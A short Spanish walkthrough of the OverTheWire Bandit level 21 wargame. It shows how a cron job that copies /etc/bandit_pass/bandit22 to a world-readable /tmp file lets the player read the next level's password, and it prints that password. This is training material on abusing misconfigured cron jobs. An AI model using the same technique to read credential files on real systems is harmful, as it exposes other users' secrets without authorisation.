# Abusando de tareas Cron \[Bandit21]

Sacar la password de bandit22, fijandonos en las tareas crontab /etc/cron.d&#x20;

```
// Leemos el fichero cronjob_bandit22 y vemos que lo que hace

@reboot bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null

//vamos a ver la ruta donde se esta llevando a cabo la accion

bandit21@bandit:/usr/bin$ cat cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv

// vemos que el script enviamos la password de bandit22 y tenemos permiso de lectura

cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff
```
